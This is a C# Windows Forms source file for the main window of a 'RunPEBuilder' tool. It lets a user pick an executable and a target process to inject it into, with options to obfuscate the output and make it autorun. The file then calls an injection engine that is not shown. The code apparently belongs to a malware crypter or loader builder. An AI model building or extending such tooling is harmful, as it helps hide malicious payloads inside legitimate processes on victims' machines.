using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace RunPEBuilder
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        private void BuidBtn_Click(object sender, EventArgs e)
        {
            string
                FileName = File_Box.Text,
                InjectProcess = SelectedProcess.Text;

            bool
                obfuscate = ObfuscateChk.Checked,
                autorun = AutoRun_Chk.Checked;

            if (string.IsNullOrEmpty(FileName) || string.IsNullOrEmpty(InjectProcess))
            {
                MessageBox.Show("Forms cannot be empty!", "~Build Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Title = "Save File";
                saveFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string result = Include.RuntimeEngine.RuntimeMain(FileName, saveFileDialog.FileName, InjectProcess, obfuscate, autorun);

                    MessageBox.Show(result, "~Build Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

            }
        }

        private void SelectFileBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select exe-file.";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File_Box.Text = openFileDialog.FileName;
                    return;
                }
            }
        }
    }
}
